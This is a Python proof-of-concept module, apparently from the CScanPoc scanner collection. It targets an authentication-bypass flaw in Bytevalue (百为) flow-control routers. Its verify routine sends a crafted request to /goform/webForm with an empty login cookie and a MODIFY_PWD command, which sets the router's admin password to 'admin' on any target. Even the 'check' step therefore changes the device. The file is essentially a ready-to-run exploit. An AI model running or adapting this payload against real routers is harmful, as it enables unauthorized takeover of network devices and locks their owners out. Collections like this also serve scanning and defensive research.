# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'Bytevalue_0001'  # 平台漏洞编号，留空
    name = '百为流控路由管理员密码重置'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-09'  # 漏洞公布时间
    desc = '''
        百为流控路由正常请求中包含fsm_login的值，为权限验证值。
        直接删掉fsm_login的值更换host即可绕过权限验证，
        修改host即可实现攻击不同目标，将admin用户密码修改为admin
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '百为流控路由'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2a2cef96-ca3b-490d-8578-f209ac48a7dd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            """
            POC Name  :  百为流控路由管理员密码重置漏洞
            Author    :  a
            mail      :  a@lcx.cc
            Referer   :  http://www.wooyun.org/bugs/wooyun-2010-099869
            """
            hh = hackhttp.hackhttp()
            payload = '/goform/webForm'
            cookie = 'fsm_u=admin; fsm_login='
            data = 'cmd=MODIFY_PWD&json=%7B%22NewPwd%22%3A%22admin%22%7D'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url, data, cookie=cookie)

            if '{ "ret": 0 }' in res and code == 200:
                #security_hole(arg + '  Has resetting password user:%s pass:%s' %('admin','admin'))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
